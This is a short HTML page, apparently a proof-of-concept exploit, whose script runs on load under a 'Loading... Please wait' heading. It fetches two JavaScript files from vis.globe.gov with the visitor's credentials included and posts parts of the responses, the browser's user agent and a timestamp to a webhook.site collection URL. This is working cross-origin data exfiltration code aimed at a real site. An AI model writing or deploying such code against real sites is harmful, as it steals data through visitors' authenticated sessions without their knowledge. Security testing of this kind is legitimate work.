<!DOCTYPE html>
<html>
<body>
<h2>Loading... Please wait</h2>
<pre id="log"></pre>

<script>
function log(msg) {
  document.getElementById("log").textContent += msg + "\n";
  console.log(msg);
}

(async () => {
  try {
    const js1 = await fetch("https://vis.globe.gov/GLOBE/javascript/VISmain.js", {
      credentials: "include"
    });
    log("JS1 Status: " + js1.status);
    const data1 = await js1.text();

    const js2 = await fetch("https://vis.globe.gov/GLOBE/javascript/purify.min.js", {
      credentials: "include"
    });
    log("JS2 Status: " + js2.status);
    const data2 = await js2.text();

    log("Fetched both JS files, sending to webhook...");
    const send = await fetch("https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        file1: data1.slice(0, 200),
        file2: data2.slice(0, 200),
        userAgent: navigator.userAgent,
        ts: new Date().toISOString()
      })
    });

    log("Webhook POST status: " + send.status);
  } catch (err) {
    log("Error: " + err.message);
  }
})();
</script>
</body>
</html>
